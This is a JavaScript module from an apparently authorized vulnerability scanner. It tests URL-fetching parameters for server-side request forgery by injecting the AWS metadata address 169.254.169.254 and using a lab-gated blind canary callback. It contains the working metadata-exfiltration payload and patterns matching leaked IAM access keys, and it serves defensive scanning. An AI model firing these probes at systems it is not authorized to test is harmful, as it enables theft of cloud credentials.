// Dark Matter rule-based scanner — SSRF probe (v1).
// Hunts URL-fetching parameters and tests cloud-metadata exfiltration.
//
// CONFIRMATION RULE (9 Nov 2026, Zerodha FP fix): a finding confirms
// ONLY on content actually FETCHED from the metadata URL — a value or
// document shape that only a metadata response contains (an AMI /
// instance id value, IMDS credential JSON, a role name, or the
// metadata listing itself). The payload URL reflected in the page is
// NOT fetch proof: the URL itself carries "meta-data" as a path
// segment, so a bare-word match ("meta-data", "ami-id",
// "instance-id") fires on any page that echoes its own query string
// — exactly the Zerodha false positive. The response is stripped of
// every reflection of the sent URL (raw and percent-encoded) before
// matching, and a match that only existed inside the echoed request
// URL is never confirmation.
//
// BLIND LEG (14 Nov 2026, coverage rows #237 [High] + #311 — the same
// concept filed twice): a fetch that happens but returns nothing to
// the attacker can never confirm under the metadata oracle — that is
// the definition of blind SSRF. The blind leg sends a collaborator
// canary URL as the param value (opts.oobCallback + opts.oobWaitFor,
// the same collaborator seam sqli-oob and xxe use) and confirms ONLY
// when the canary listener records a hit for the probe token AND a
// never-advertised control token records NO hit.
//
// CONTROL DESIGN — DELIBERATE DEVIATION FROM THE ssrfReferer.js
// LEG-1 COPY (live evidence, 14 Nov 2026): ssrfReferer sends its
// control canary the same way as its probe (as a Referer) and relies
// on a per-page-cache assumption — its own tests model the target as
// "a link preview cached per page — only the first canary Referer is
// fetched". That assumption has NO param equivalent: a server that
// fetches a URL param fetches EVERY value it is given, probe and
// control alike. A throwaway live check proved it — a mock target
// that fetches any ?url= value and returns nothing caused BOTH the
// probe and the control token to hit, so the literal copy REJECTS a
// genuinely vulnerable fetcher (false negative by design). The blind
// leg therefore sends ONLY the probe canary: the control token is
// waited on but NEVER appears in any request, so a hit for it can
// only mean the listener records hits the probe did not cause (a
// noisy/broken listener) — the probe hit is unattributable and the
// leg rejects. The probe token is fresh-random per run and was
// advertised only in the probe request, so its hit already attributes
// the fetch to the probe. This keeps the two-token differential the
// fix plan asked for, without the false negative.
// The leg is LAB-GATED: it runs only when the target host is listed
// in opts.labTargets, and the wiring starts the collaborator only
// for lab-gated scans — a non-lab target never receives a callback
// URL. Without the collaborator seam the leg is skipped, never
// guessed at. The blind leg is capped at the first 2 URL-shaped
// params (the sqli-oob global-cap discipline) and is skipped on a
// param the metadata leg already confirmed — that param is already
// proven fetchable, and the blind leg adds nothing there.
import { randomBytes } from 'node:crypto';
import { isLabTargetHost } from '../../labCreds.js';
import { mutateUrl, probePointName, probePointParameter, noteAttemptedPoints } from '../probePoints.js';
const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';
const URL_PARAM_RE = /^(url|uri|image|img|src|source|fetch|feed|redirect|next|callback|webhook)$/i;
// How long the blind leg waits for the canary hit (the target fetches
// asynchronously, so the window must cover a slow fetcher) and how
// long the control token gets to prove its absence — same values as
// ssrfReferer.js leg 1.
const BLIND_PROBE_WAIT_MS = 5000;
const BLIND_CONTROL_WAIT_MS = 1000;
// The blind leg tries at most this many URL-shaped params per scan
// target (sqli-oob global-cap discipline: each param costs a
// probe wait + a control wait).
const BLIND_PARAM_CAP = 2;

const METADATA_URL = 'http://169.254.169.254/latest/meta-data/';

// Markers a fetched IMDS document contains that the payload URL
// itself never does. All are VALUE-shaped (an id, a JSON field, a
// role name) — bare words such as "meta-data" or "ami-id" are
// deliberately absent from this list: they appear in docs, error
// pages and the reflected request URL.
const FETCHED_VALUE_MARKERS = [
  /ami-[0-9a-f]{8,17}/i,
  /instance-id.{0,120}?i-[0-9a-f]{8,17}/is,
  /"instanceId"\s*:\s*"i-[0-9a-f]{8,17}"/i,
  /"AccessKeyId"\s*:\s*"A[A-Z0-9]{15,20}"/,
  /security-credentials\/[A-Za-z0-9._=-]+/i,
];

// Field names of the /latest/meta-data/ listing document. A single
// field name proves nothing (docs list them too); two or more as
// whole lines is the listing itself, echoed by a server-side fetch.
const METADATA_LISTING_FIELDS = [
  'ami-id',
  'ami-launch-index',
  'ami-manifest-path',
  'instance-id',
  'instance-type',
  'local-ipv4',
  'public-ipv4',
  'public-hostname',
  'placement',
  'security-credentials',
  'iam',
];

// Strip every reflection of the sent URL from the body before
// matching: the raw URL, its percent-encoded form, and the bare
// metadata URL in both forms. A match that only existed inside the
// echoed request URL is not fetch proof.
export function stripReflectedUrl(body, sentUrl) {
  let out = String(body || '');
  for (const variant of [
    sentUrl,
    sentUrl ? encodeURIComponent(sentUrl) : '',
    METADATA_URL,
    encodeURIComponent(METADATA_URL),
  ]) {
    if (variant) out = out.split(variant).join('');
  }
  return out;
}

// The fetched-metadata proof in a response body, or null. Matches
// only after reflections of the sent URL are stripped: either a
// value-shaped marker (an id, credential JSON, role name) or at
// least two listing fields as whole lines.
export function fetchedMetadataMarker(body, sentUrl) {
  const clean = stripReflectedUrl(body, sentUrl);
  for (const re of FETCHED_VALUE_MARKERS) {
    const m = clean.match(re);
    if (m) return { marker: m[0], clean };
  }
  const lines = new Set(
    clean
      .split(/\r?\n/)
      .map((l) => l.trim().toLowerCase())
      .filter(Boolean)
  );
  const fieldHits = METADATA_LISTING_FIELDS.filter((f) => lines.has(f));
  // Quote the first listing field in evidence; the window around it
  // shows the listing itself.
  if (fieldHits.length >= 2) return { marker: fieldHits[0], clean };
  return null;
}

async function get(url, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, { signal: ctrl.signal, headers: { 'User-Agent': UA, ...(opts.headers || {}) } });
    return await res.text().catch(() => '');
  } finally {
    clearTimeout(t);
  }
}

function rand() {
  return randomBytes(4).toString('hex');
}

// ---- pure helpers (exported for unit tests) ---------------------------------

/**
 * The canary URL for a probe token: the collaborator base plus the
 * token as the path, so the listener can attribute the hit. Pure.
 */
export function ssrfBlindCanaryUrl(base, token) {
  return `${String(base).replace(/\/+$/, '')}/${token}`;
}

/**
 * Judge the blind leg: confirmed only when the probe token's canary
 * was hit and the never-advertised control token's was not. Pure.
 * (The control token is never sent to the target — it is waited on
 * only — so a hit for it means the listener records hits the probe
 * did not cause.)
 */
export function assessBlindSsrf({ probeHit, controlHit }) {
  if (probeHit && !controlHit) {
    return {
      verdict: 'confirmed',
      reason: 'canary hit arrived for the probe URL and none for the never-advertised control token',
    };
  }
  if (!probeHit) {
    return { verdict: 'rejected', reason: 'no canary hit arrived for the probe URL — the server did not fetch it' };
  }
  return {
    verdict: 'rejected',
    reason: 'a hit arrived for the never-advertised control token — the listener records hits the probe did not cause',
  };
}


export async function probeSsrf(url, params, opts = {}) {
  const findings = [];
  const diag = opts && typeof opts.diagnostics === 'object' && opts.diagnostics ? opts.diagnostics : null;
  const setDiag = (k, v) => {
    if (diag) diag[k] = v;
  };
  const candidates = params.filter((p) => URL_PARAM_RE.test(probePointName(p)));
  noteAttemptedPoints(opts, candidates.slice(0, 5));
  const metadataConfirmed = new Set();
  for (const param of candidates.slice(0, 5)) {
    const sentUrl = mutateUrl(url, param, METADATA_URL);
    let body;
    try {
      body = await get(sentUrl, opts);
    } catch {
      continue;
    }
    const hit = fetchedMetadataMarker(body, sentUrl);
    if (hit) {
      const idx = hit.clean.indexOf(hit.marker);
      const window = hit.clean.slice(Math.max(0, idx - 60), idx + 120);
      metadataConfirmed.add(probePointName(param));
      findings.push({
        class: 'ssrf',
        id: `ssrf-metadata-${probePointName(param)}`,
        title: `SSRF in parameter '${probePointParameter(param)}' — cloud metadata reachable`,
        severity: 'critical',
        url,
        param: probePointParameter(param),
        evidence: {
          request: `GET ${sentUrl}`,
          response: `cloud metadata marker in the response — "...${window}..."`,
          impact_demo: 'the server-side fetcher reached 169.254.169.254',
          oobHit: true,
        },
      });
    }
  }

  // ---- Blind leg — collaborator canary + control (rows #237 / #311) ------
  // Needs the collaborator seam; without it the leg is skipped,
  // never guessed at. Lab-gated twice: the wiring starts the
  // collaborator only for lab hosts, and the probe re-checks
  // opts.labTargets before sending anything.
  const oobCallback = typeof opts.oobCallback === 'string' && opts.oobCallback ? opts.oobCallback : null;
  const oobWaitFor = typeof opts.oobWaitFor === 'function' ? opts.oobWaitFor : null;
  if (!oobCallback || !oobWaitFor) {
    setDiag('blindVerdict', 'skipped-no-collaborator');
    return findings;
  }
  if (!isLabTargetHost(url, opts.labTargets)) {
    setDiag('blindVerdict', 'skipped-non-lab');
    return findings;
  }
  let blindTried = 0;
  let blindConfirmed = false;
  for (const param of candidates.slice(0, BLIND_PARAM_CAP)) {
    // A param the metadata leg already confirmed is proven
    // fetchable — the blind leg adds nothing there.
    if (metadataConfirmed.has(probePointName(param))) continue;
    const probeToken = `dmssrf-${rand()}`;
    const controlToken = `dmssrf-ctrl-${rand()}`;
    const probeCanary = ssrfBlindCanaryUrl(oobCallback, probeToken);
    blindTried += 1;
    // Only the probe canary is ever sent: a server that fetches a
    // URL param fetches every value it is given, so sending the
    // control canary the same way would make a genuinely vulnerable
    // target hit it too and the leg would reject it (see header).
    let sent = false;
    try {
      await get(mutateUrl(url, param, probeCanary), opts);
      sent = true;
    } catch {
      sent = false;
    }
    let probeHit = false;
    if (sent) {
      try {
        probeHit = Boolean(await oobWaitFor(probeToken, BLIND_PROBE_WAIT_MS));
      } catch {
        probeHit = false;
      }
    }
    // The control token is NEVER sent to the target — it is waited
    // on only, so a hit for it proves the listener records hits the
    // probe did not cause (a noisy/broken listener).
    let controlHit = false;
    try {
      controlHit = Boolean(await oobWaitFor(controlToken, BLIND_CONTROL_WAIT_MS));
    } catch {
      controlHit = false;
    }
    setDiag('blindProbeHit', probeHit);
    setDiag('blindControlHit', controlHit);
    const judged = assessBlindSsrf({ probeHit, controlHit });
    if (judged.verdict === 'confirmed') {
      blindConfirmed = true;
      findings.push({
        class: 'ssrf_blind',
        id: `ssrf-blind-${probePointName(param)}`,
        title: `Blind SSRF in parameter '${probePointParameter(param)}' — server fetched the collaborator URL without returning content`,
        severity: 'high',
        url,
        param: probePointParameter(param),
        evidence: {
          request: `GET ${mutateUrl(url, param, probeCanary)} (control token ${controlToken} never sent; no hit recorded for it)`,
          response: `The canary listener recorded a hit for the probe URL token and none for the control token — the server issued a request to the attacker-supplied URL and returned nothing. ${judged.reason}.`,
          impact_demo: 'An attacker-controlled URL becomes a server-side request with no response needed: internal-service probing and cloud-metadata reads through a blind fetch.',
          signalCorrelated: true,
          oobHit: true,
        },
      });
    }
  }
  setDiag('blindParamsTried', blindTried);
  setDiag('blindVerdict', blindConfirmed ? 'confirmed' : 'rejected');
  return findings;
}
